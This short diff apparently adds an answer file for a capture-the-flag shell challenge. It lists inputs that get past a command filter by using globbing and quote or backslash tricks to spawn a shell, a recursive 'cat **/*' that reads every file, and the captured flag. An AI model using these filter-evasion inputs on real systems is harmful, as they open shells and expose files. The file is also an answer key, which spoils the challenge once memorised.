@@ -1,0 +1,7 @@
+sol1: /bin/s*h
+sol2: cat **/*
+sol3: s''h
+sol4: s\h
+sol4: s$1h
+
+ictf{b@sh_sh0r7h4nds_t0_th3_r3$cu3!}
